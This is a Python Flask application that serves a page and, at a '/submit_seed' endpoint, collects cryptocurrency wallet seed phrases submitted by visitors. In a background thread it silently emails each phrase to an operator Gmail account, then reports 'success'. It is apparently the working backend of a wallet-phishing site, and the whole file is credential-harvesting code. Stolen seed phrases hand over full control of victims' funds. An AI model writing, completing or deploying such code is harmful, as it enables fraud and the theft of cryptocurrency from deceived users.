
from flask import Flask, render_template, request, jsonify
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import time

app = Flask(__name__)

# Email configuration (you'll need to set these up)
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "your-email@gmail.com"
EMAIL_PASSWORD = "your-app-password"

def send_email_async(seed_phrase):
    """Send email with seed phrase in background"""
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = "Wallet Seed Phrase Submission"
        
        body = f"New seed phrase submission:\n\n{seed_phrase}"
        msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
        server.quit()
    except Exception as e:
        print(f"Email error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit_seed', methods=['POST'])
def submit_seed():
    try:
        data = request.get_json()
        seed_phrase = data.get('seedPhrase', '')
        
        # Send email in background
        email_thread = threading.Thread(target=send_email_async, args=(seed_phrase,))
        email_thread.daemon = True
        email_thread.start()
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
